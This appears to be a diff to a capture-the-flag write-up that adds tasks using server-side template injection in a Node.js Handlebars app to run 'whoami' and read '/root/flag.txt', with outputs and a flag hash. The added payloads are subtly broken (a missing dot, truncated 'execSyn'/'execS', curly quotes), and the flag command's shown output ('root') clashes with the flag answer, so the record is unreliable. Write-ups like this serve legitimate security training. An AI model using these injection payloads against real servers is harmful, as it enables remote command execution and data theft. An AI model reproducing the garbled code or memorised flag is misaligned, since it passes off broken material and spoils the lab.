@@ -94,8 +94,36 @@ Output:
 ```
 Answer: **require**
 
-#### Task 10: By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?
+#### Task 10: What variable is the name of the top-level scope in Node.JS?
 
 Answer: **global**
+
+#### Task 11: By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?
+Command:
+```html
+{{this.push “return process.mainModulerequire(‘child_process’).execSyn(‘whoami’);”}}
+```
+Output:
+```html
+root
+```
+
+Answer: **root**
+
+#### Task 12: Submit root flag
+Command:
+```html
+{{this.push “return process.mainModulerequire(‘child_process’).execS(‘cat /root/flag.txt’);”}}
+```
+Output:
+```html
+root
+```
+
+Answer: **6b258d726d287462d60c103d0142a81c**
+
+
+
+
 
 
